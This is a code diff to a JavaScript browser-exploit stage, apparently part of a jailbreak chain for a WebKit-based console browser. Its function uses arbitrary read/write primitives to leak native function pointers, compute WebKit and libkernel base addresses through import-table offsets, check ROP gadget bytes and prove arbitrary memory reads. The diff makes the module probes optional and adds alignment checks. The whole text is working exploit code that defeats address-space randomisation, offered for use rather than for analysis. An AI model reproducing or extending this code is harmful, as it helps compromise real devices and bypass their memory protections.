@@ -52,6 +52,18 @@ function checkGadgetBytes(p, base, rva, pat) {
     return true;
 }
 
+function alignModuleBase(addr) {
+    if (!addr) return null;
+    return new int64(addr.low & ~0x3fff, addr.hi);
+}
+
+function plausibleModuleBase(addr) {
+    if (!addr) return false;
+    if (addr.hi < 0x80) return false;
+    if ((addr.low & 0x3fff) !== 0) return false;
+    return true;
+}
+
 function leakNativeFn(p, off, fn, label) {
     const fnOff = off.wk_JSFunction_m_function != null ? off.wk_JSFunction_m_function : 0x28;
     const cell = p.leakval(fn);
@@ -64,11 +76,14 @@ function leakNativeFn(p, off, fn, label) {
  * @param {object} p window.p
  * @param {object} off firmware offsets
  * @param {object} carrier from establishPrimitive
- * @param {{ log: function, readPrimitivePass?: boolean, pairStatus?: object }} ctx
+ * @param {{ log: function, readPrimitivePass?: boolean, pairStatus?: object,
+ *           probeModules?: boolean, verboseLeak?: boolean }} ctx
  */
 export function runArwProofVerbose(p, off, carrier, ctx) {
     ctx = ctx || {};
     const log = ctx.log || (() => {});
+    const verboseLeak = ctx.verboseLeak === true;
+    const probeModules = ctx.probeModules === true;
     const addresses = [];
     const results = {
         readPrimitivePass: !!ctx.readPrimitivePass,
@@ -165,17 +180,18 @@ export function runArwProofVerbose(p, off, carrier, ctx) {
         if (ps.workerVector) step("PAIR", "workerVector", fmtAddr(ps.workerVector));
     }
 
-    step("LEAK", "BEGIN", "leakval every anchor + common builtins");
+    step("LEAK", "BEGIN", "leakval anchors + proof boxes"
+        + (verboseLeak ? " (full dumps)" : " (lite — ?verbose=1 for dumps)"));
     const leakTargets = [
         ["parseInt", parseInt],
         ["parseFloat", parseFloat],
-        ["Object", Object],
-        ["Array", Array],
-        ["Math.expm1", Math.expm1],
         ["boxA", { tag: "arwA", n: 1 }],
         ["boxB", { tag: "arwB", n: 2 }],
-        ["boxC", { tag: "arwC", n: 3 }],
     ];
+    if (verboseLeak) {
+        leakTargets.push(["Object", Object], ["Array", Array], ["Math.expm1", Math.expm1]);
+        leakTargets.push(["boxC", { tag: "arwC", n: 3 }]);
+    }
     if (carrier && carrier.textarea) leakTargets.push(["textarea", carrier.textarea]);
     if (carrier && carrier.anchorObject) leakTargets.push(["anchorObject", carrier.anchorObject]);
 
@@ -189,87 +205,22 @@ export function runArwProofVerbose(p, off, carrier, ctx) {
             const hdr = read8p(p, cell);
             if (hdr) {
                 step("LEAK", label + ".header", fmtAddr(hdr));
-                step("LEAK", label + ".dump", dumpBytes(p, cell, 0x30));
+                if (verboseLeak)
+                    step("LEAK", label + ".dump", dumpBytes(p, cell, 0x30));
             }
-            for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
-                const q = read8p(p, cell.add32(off));
-                if (q && (q.low !== 0 || q.hi !== 0)) {
-                    record("leak." + label + "." + tag, q, "cell+0x" + off.toString(16));
-                    step("LEAK", label + "." + tag, fmtAddr(q));
+            if (verboseLeak) {
+                for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
+                    const q = read8p(p, cell.add32(off));
+                    if (q && (q.low !== 0 || q.hi !== 0)) {
+                        record("leak." + label + "." + tag, q, "cell+0x" + off.toString(16));
+                        step("LEAK", label + "." + tag, fmtAddr(q));
+                    }
                 }
             }
             leaked.push({ label, obj, cell });
         } catch (e) {
             fail("LEAK", label, e.message || String(e));
         }
-    }
-
-    step("NATIVE", "BEGIN", "resolve parseInt + parseFloat native code pointers");
-    const pi = leakNativeFn(p, off, parseInt, "parseInt");
-    const pf = leakNativeFn(p, off, parseFloat, "parseFloat");
-    for (const row of [pi, pf]) {
-        if (row.cell) record("native." + row.label + ".cell", row.cell, "leakval");
-        if (row.jsFunction) {
-            record("native." + row.label + ".JSFunction", row.jsFunction, "cell+0x18");
-            step("NATIVE", row.label + ".JSFunction", fmtAddr(row.jsFunction));
-        }
-        if (row.nativeFn) {
-            record("native." + row.label + ".code", row.nativeFn, "m_function");
-            const q0 = read4p(p, row.nativeFn);
-            step("NATIVE", row.label + ".code", fmtAddr(row.nativeFn)
-                + "  first4=" + fmtHex32(q0));
-            step("NATIVE", row.label + ".prologue", dumpBytes(p, row.nativeFn, 16));
-            try { sessionStorage.setItem("wk-nativeFn", String(row.nativeFn)); } catch (_) { }
-        }
-    }
-
-    let webkitBase = null;
-    const parseIntOff = off.wk_parseint_native != null ? off.wk_parseint_native : off.wk_expm1_builtin;
-    const nativeForBase = pi.nativeFn || pf.nativeFn;
-    if (nativeForBase && parseIntOff != null) {
-        webkitBase = nativeForBase.sub32(parseIntOff);
-        record("webkitBase", webkitBase, "nativeFn - 0x" + parseIntOff.toString(16));
-        step("WEBKIT", "BASE-CANDIDATE", fmtAddr(webkitBase)
-            + "  (native - 0x" + parseIntOff.toString(16) + ")");
-        const magic = read4p(p, webkitBase);
-        step("WEBKIT", "ELF-PEEK", "magic=" + fmtHex32(magic)
-            + (magic === ELF_MAGIC ? "  (ELF OK)" : ""));
-        if (magic === ELF_MAGIC) {
-            results.webkitVerified = true;
-            pass("WEBKIT", "ELF-MAGIC", fmtAddr(webkitBase));
-        } else if (off.wk_POP_RDI_RET != null
-            && checkGadgetBytes(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3])) {
-            results.webkitVerified = true;
-            pass("WEBKIT", "POP_RDI", "@+" + off.wk_POP_RDI_RET.toString(16));
-        } else {
-            warn("WEBKIT", "UNVERIFIED", "ELF/gadget miss — R/W still valid if primitive passed");
-        }
-        try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
-    } else {
-        warn("WEBKIT", "SKIP", "no native fn or offset for base leak");
-    }
-
-    if (webkitBase && off.wk___imp___error != null && off.k__error != null) {
-        const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
-        if (errorFn) {
-            const lk = errorFn.sub32(off.k__error);
-            record("libkernelBase", lk, "__imp___error - k__error");
-            step("LIBKERNEL", "BASE-CANDIDATE", fmtAddr(lk));
-            const w0 = read4p(p, lk);
-            const w1 = read4p(p, lk.add32(4));
-            step("LIBKERNEL", "PROLOGUE", "w0=" + fmtHex32(w0) + " w1=" + fmtHex32(w1));
-            if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
-                results.libkernelVerified = true;
-                pass("LIBKERNEL", "_error-prologue", fmtAddr(lk));
-                try { sessionStorage.setItem("wk-libkernelBase", String(lk)); } catch (_) { }
-            } else {
-                warn("LIBKERNEL", "UNVERIFIED", "prologue mismatch (game dump offsets?)");
-            }
-        } else {
-            warn("LIBKERNEL", "IAT-NULL", "__imp___error unreadable");
-        }
-    } else {
-        step("LIBKERNEL", "SKIP", "no IAT offsets in table");
     }
 
     step("RW-TEST", "DISTINCT-LEAK", "two JSObject cells must differ");
@@ -347,24 +298,107 @@ export function runArwProofVerbose(p, off, carrier, ctx) {
         fail("RW-TEST", "ARRAYBUFFER", "impl null @ cell+0x" + implOff.toString(16));
     }
 
-    if (webkitBase && results.webkitVerified) {
-        step("RW-TEST", "ARBITRARY-READ", "read ELF header @ webkit base (proves aim works off-heap)");
-        const b0 = read1p(p, webkitBase);
-        const b1 = read1p(p, webkitBase.add32(1));
-        const b2 = read1p(p, webkitBase.add32(2));
-        const b3 = read1p(p, webkitBase.add32(3));
-        step("RW-TEST", "webkit-bytes", dumpBytes(p, webkitBase, 16));
-        if (b0 === 0x7f && b1 === 0x45 && b2 === 0x4c && b3 === 0x46)
-            pass("RW-TEST", "ARBITRARY-READ", "ELF \\x7fELF @ " + fmtAddr(webkitBase));
-        else
-            warn("RW-TEST", "ARBITRARY-READ", "bytes=" + [b0, b1, b2, b3].map(x => fmtHex32(x)).join(" "));
-    }
-
-    const rwOk = results.readPrimitivePass
+    const rwCoreOk = results.readPrimitivePass
         && results.distinctLeak
         && results.headerRoundtrip
         && results.arrayBufferRead
         && results.arrayBufferWrite;
+    if (rwCoreOk)
+        pass("RW-TEST", "CORE-OK", "heap R/W tests passed — module probes optional below");
+
+    step("NATIVE", "BEGIN", "parseInt native ptr (from carrier or leak)");
+    let piNative = null;
+    if (carrier && carrier.native && carrier.native.nativeFn != null) {
+        const nf = carrier.native.nativeFn;
+        piNative = typeof nf === "object" && nf.low != null ? nf : null;
+        if (!piNative && typeof nf === "number" && nf > 0)
+            piNative = new int64(nf >>> 0, Math.floor(nf / 0x100000000));
+        if (piNative) {
+            record("native.parseInt.code", piNative, "carrier.native");
+            step("NATIVE", "parseInt.code", fmtAddr(piNative) + "  (carrier snapshot)");
+        }
+    }
+    if (!piNative) {
+        const pi = leakNativeFn(p, off, parseInt, "parseInt");
+        piNative = pi.nativeFn;
+        if (pi.nativeFn) {
+            step("NATIVE", "parseInt.code", fmtAddr(pi.nativeFn) + "  first4="
+                + fmtHex32(read4p(p, pi.nativeFn)));
+        }
+    }
+    if (piNative && verboseLeak)
+        step("NATIVE", "parseInt.prologue", dumpBytes(p, piNative, 16));
+    if (piNative)
+        try { sessionStorage.setItem("wk-nativeFn", String(piNative)); } catch (_) { }
+
+    let webkitBase = null;
+    if (!probeModules) {
+        step("WEBKIT", "SKIP", "module memory probes off (default — avoids OOM on bad base)"
+            + "  add ?modules=1 to probe ELF/lk");
+        step("LIBKERNEL", "SKIP", "requires ?modules=1 and verified webkit base");
+    } else {
+        const parseIntOff = off.wk_parseint_native != null ? off.wk_parseint_native : off.wk_expm1_builtin;
+        if (piNative && parseIntOff != null) {
+            webkitBase = alignModuleBase(piNative.sub32(parseIntOff));
+            record("webkitBase", webkitBase, "align16(native - 0x" + parseIntOff.toString(16) + ")");
+            step("WEBKIT", "BASE-CANDIDATE", fmtAddr(webkitBase));
+            if (!plausibleModuleBase(webkitBase)) {
+                warn("WEBKIT", "SKIP-PROBE", "base not 16KB-aligned — will not read module memory");
+                webkitBase = null;
+            } else {
+                const magic = read4p(p, webkitBase);
+                step("WEBKIT", "ELF-PEEK", "magic=" + fmtHex32(magic)
+                    + (magic === ELF_MAGIC ? "  (ELF OK)" : ""));
+                if (magic === ELF_MAGIC) {
+                    results.webkitVerified = true;
+                    pass("WEBKIT", "ELF-MAGIC", fmtAddr(webkitBase));
+                } else if (off.wk_POP_RDI_RET != null
+                    && checkGadgetBytes(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3])) {
+                    results.webkitVerified = true;
+                    pass("WEBKIT", "POP_RDI", "@+" + off.wk_POP_RDI_RET.toString(16));
+                } else {
+                    warn("WEBKIT", "UNVERIFIED", "ELF/gadget miss — skipping lk IAT (no wild reads)");
+                }
+                if (results.webkitVerified)
+                    try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
+            }
+        } else {
+            warn("WEBKIT", "SKIP", "no native fn or offset for base leak");
+        }
+
+        if (webkitBase && results.webkitVerified
+            && off.wk___imp___error != null && off.k__error != null) {
+            const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
+            if (errorFn) {
+                const lk = alignModuleBase(errorFn.sub32(off.k__error));
+                record("libkernelBase", lk, "__imp___error - k__error");
+                step("LIBKERNEL", "BASE-CANDIDATE", fmtAddr(lk));
+                const w0 = read4p(p, lk);
+                const w1 = read4p(p, lk.add32(4));
+                step("LIBKERNEL", "PROLOGUE", "w0=" + fmtHex32(w0) + " w1=" + fmtHex32(w1));
+                if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
+                    results.libkernelVerified = true;
+                    pass("LIBKERNEL", "_error-prologue", fmtAddr(lk));
+                    try { sessionStorage.setItem("wk-libkernelBase", String(lk)); } catch (_) { }
+                } else {
+                    warn("LIBKERNEL", "UNVERIFIED", "prologue mismatch (13.52 IAT may differ from 13.50)");
+                }
+            } else {
+                warn("LIBKERNEL", "IAT-NULL", "__imp___error unreadable");
+            }
+        } else if (webkitBase && !results.webkitVerified) {
+            step("LIBKERNEL", "SKIP", "webkit unverified — no lk probe");
+        } else {
+            step("LIBKERNEL", "SKIP", "no IAT offsets or webkit base");
+        }
+
+        if (webkitBase && results.webkitVerified) {
+            step("RW-TEST", "ARBITRARY-READ", "ELF header @ verified webkit base");
+            step("RW-TEST", "webkit-bytes", dumpBytes(p, webkitBase, 16));
+        }
+    }
+
+    const rwOk = rwCoreOk;
 
     step("SUMMARY", "CHECKLIST",
         "primitive=" + results.readPrimitivePass
@@ -374,6 +408,10 @@ export function runArwProofVerbose(p, off, carrier, ctx) {
         + " ab-write=" + results.arrayBufferWrite
         + " webkit=" + results.webkitVerified
         + " lk=" + results.libkernelVerified);
+    try {
+        const lkSaved = sessionStorage.getItem("wk-libkernelBase");
+        if (lkSaved) step("SUMMARY", "2E-LK", "session lk=0x" + lkSaved.replace(/^0x/i, ""));
+    } catch (_) { }
     step("SUMMARY", "ADDRESSES", addresses.length + " recorded (see LEAK/CARRIER lines above)");
 
     if (rwOk) {
